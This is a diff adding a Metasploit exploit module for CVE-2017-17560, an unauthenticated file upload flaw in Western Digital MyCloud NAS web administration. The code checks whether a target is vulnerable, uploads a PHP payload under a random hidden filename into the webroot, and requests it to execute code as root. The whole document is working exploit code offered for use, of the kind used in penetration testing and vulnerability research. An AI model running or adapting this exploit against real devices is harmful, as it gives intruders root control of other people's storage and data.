@@ -1,0 +1,107 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+  HttpFingerprint = { :method => 'HEAD', :uri => '/web/', :pattern => [/Apache/] }
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::FileDropper
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => 'Western Digital MyCloud multi_uploadify File Upload Vulnerability',
+      'Description'    => %q{
+        This module exploits a file upload vulnerability found in Western Digital's MyCloud
+        NAS web administration HTTP service. The /web/jquery/uploader/multi_uploadify.php
+        PHP script provides multipart upload functionality that is accessible without authentication
+        and can be used to place a file anywhere on the device's file system. This allows an
+        attacker the ability to upload a PHP shell onto the device and obtain arbitrary code
+        execution as root.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Zenofex <zenofex[at]exploitee.rs>' # Initial vulnerability discovery, PoC, and Metasploit module
+        ],
+      'References'     =>
+        [
+          ['URL', 'https://www.exploitee.rs/index.php/Western_Digital_MyCloud#.2Fjquery.2Fuploader.2Fmulti_uploadify.php_.28added_08.2F06.2F2017.29'],
+          ['URL', 'https://download.exploitee.rs/file/generic/Exploiteers-DEFCON25.pdf'],
+          ['URL', 'https://www.youtube.com/watch?v=EO_49pfmA5A'],
+          ['CVE', '2017-17560']
+        ],
+      'Platform'       => 'php',
+      'Arch'           => ARCH_PHP,
+      'Targets'        =>
+        [
+          ['Automatic Targeting', { 'auto' => true }]
+        ],
+      'Privileged'     => true,
+      'DisclosureDate' => 'Jul 29 2017',
+      'DefaultTarget'  => 0))
+  end
+
+  def check
+    res = send_request_cgi('uri' => '/web/jquery/uploader/multi_uploadify.php')
+
+    if res.nil?
+      vprint_error('Connection failed')
+      return CheckCode::Unknown
+    end
+
+    if res.code == 302 && res.headers['Location'] =~ /\?status=1/
+      return CheckCode::Vulnerable
+    end
+
+    CheckCode::Safe
+  end
+
+  def upload(web_folder, fname, file)
+    # construct post data
+    data = Rex::MIME::Message.new
+    data.add_part(file, 'application/x-php', nil, "form-data; name=\"Filedata[]\"; filename=\"#{fname}\"")
+
+    # upload
+    res = send_request_cgi({
+      'method'  => 'POST',
+      'uri'     => '/web/jquery/uploader/multi_uploadify.php',
+      'ctype'   => "multipart/form-data; boundary=#{data.bound}",
+      'data'    => data.to_s,
+      'vars_get' => {
+        'folder' => web_folder
+      }
+    })
+  end
+
+  def exploit
+    if check != CheckCode::Vulnerable
+      fail_with(Failure::NotVulnerable, 'Target does not appear to be a vulnerable Western Digital MyCloud device')
+    end
+
+    # upload PHP payload to '/var/www' (webroot).
+    web_folder = '/var/www'
+    php   = "<?php #{payload.encoded} ?>"
+    print_status("Uploading PHP payload (#{php.length} bytes) to '#{web_folder}'.")
+    fname = ".#{rand_text_alphanumeric(rand(10) + 6)}.php"
+
+    res = upload(web_folder, fname, php)
+
+    # check upload response
+    fail_with(Failure::Unreachable, 'No response received from the target.') unless res
+    if res.code != 302 || res.headers['Location'] =~ /\?status=0/
+      fail_with(Failure::UnexpectedReply, "Unexpected reply (#{res.body.length} bytes)")
+    end
+    print_good('Uploaded PHP payload successfully.')
+
+    # register uploaded php payload file for cleanup
+    register_files_for_cleanup(fname)
+
+    # retrieve and execute PHP payload
+    print_status("Making request for '/#{fname}' to execute payload.")
+    res = send_request_cgi({'uri' => normalize_uri(fname)}, 15)
+  end
+
+end
